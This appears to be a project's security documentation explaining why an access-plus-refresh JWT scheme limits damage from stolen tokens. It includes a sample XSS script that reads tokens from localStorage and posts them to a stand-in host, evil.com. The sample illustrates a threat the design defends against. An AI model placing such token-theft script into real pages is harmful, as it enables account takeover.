# Security Documentation

## JWT Authentication Strategy

### Access Token + Refresh Token Pattern

```typescript
ACCESS_TOKEN  = "eyJhbGc..."  // 15 minutes ⏰
REFRESH_TOKEN = "eyJzdWI..."  // 7 days 🔒
```

### Why It's More Secure

#### 1. Limited Exposure Window
```
Access Token:  Sent with EVERY API request → High exposure, 15-min lifetime
Refresh Token: ONLY sent to /api/auth/refresh → Low exposure, 7-day lifetime
```

**Result:** If access token stolen, attacker has 15 minutes max instead of 7 days.

#### 2. Access Token Compromise (XSS)
```
1. Attacker steals access token via XSS
2. Attacker gains access for 15 minutes
3. Token expires automatically
4. User gets new token (attacker's token now useless)
```

#### 3. Refresh Token Compromise (Serious)
```
1. Attacker steals refresh token
2. Attacker requests new access token
3. Backend detects suspicious activity (IP/device change)
4. Backend invalidates ALL refresh tokens for user
5. User logged out everywhere, must re-authenticate
6. Attacker's stolen token is now useless
```

### Real-World Attack Scenarios

#### XSS Attack
```javascript
// Malicious script steals tokens
<script>
  const tokens = {
    access: localStorage.getItem('access_token'),
    refresh: localStorage.getItem('refresh_token')
  };
  fetch('https://evil.com/steal', { body: JSON.stringify(tokens) });
</script>
```

**Impact:**
- Single token (7 days): Full access for 7 days
- Dual token pattern: 15-minute window + backend can revoke refresh token

#### Network Sniffing (Unsecured WiFi)
```
Attacker intercepts token on public WiFi
```

**Impact:**
- Single token: 7 days of compromise
- Dual token pattern: 15 minutes max, refresh token rarely transmitted

### Security Benefits

| Feature | Single Long-Lived Token | Access + Refresh Tokens |
|---------|------------------------|-------------------------|
| Compromise window | 7 days | 15 minutes |
| Revocation | Not possible | Backend can invalidate |
| Suspicious activity detection | No | Yes (monitor refresh patterns) |
| Force re-login on device | No | Yes |
| Audit trail | Limited | Full (track refresh usage) |

### Implementation Notes

The axios interceptor at `frontend/src/services/axiosInstance.ts` handles token refresh automatically:

```typescript
// User makes request → 401 → refresh token → retry → success
// Completely transparent to the user
```

This ensures users never see "token expired" errors while maintaining security.
